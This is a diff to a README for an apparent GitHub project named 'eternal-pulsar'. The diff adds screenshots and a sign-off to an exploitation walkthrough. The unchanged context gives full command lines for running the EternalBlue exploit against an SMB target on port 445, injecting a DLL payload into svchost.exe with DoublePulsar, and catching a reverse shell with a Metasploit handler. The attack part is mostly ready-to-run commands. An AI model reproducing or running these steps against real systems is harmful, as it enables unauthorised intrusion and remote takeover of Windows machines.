@@ -25,19 +25,24 @@ you can also use other payloads <b>windows/shell_reverse_tcp</b> (stageless), <b
 
 ### Backdoor Install with EternalBlue 
 
-` Eternalblue-2.2.0.exe --TargetIp 10.10.10.10 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 - -GroomAllocations 12 --OutConfig 1.txt`
+` Eternalblue-2.2.0.exe --TargetIp 10.10.10.10 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 - -GroomAllocations 12 --OutConfig 1.txt` <br>
+
+![test1](https://github.com/sailay1996/eternal-pulsar/blob/master/img/2.jpg)
 
 
 ### Sending shellcode to inject DLL with Doublepulsar 
 
 ` Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 10.10.10.10 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll`
-
+<br>
+![test2](https://github.com/sailay1996/eternal-pulsar/blob/master/img/1.jpg)
 
 ### multi/handler listening with msf
 
 ` msfconsole -q -r msfhandler.rc`
 
 #### pwned !!!
+![test3](https://github.com/sailay1996/eternal-pulsar/blob/master/img/3.jpg)
 
-
+Thanks for watching here !!!
+<br><br>
 #### [@404death](https://twitter.com/404death)
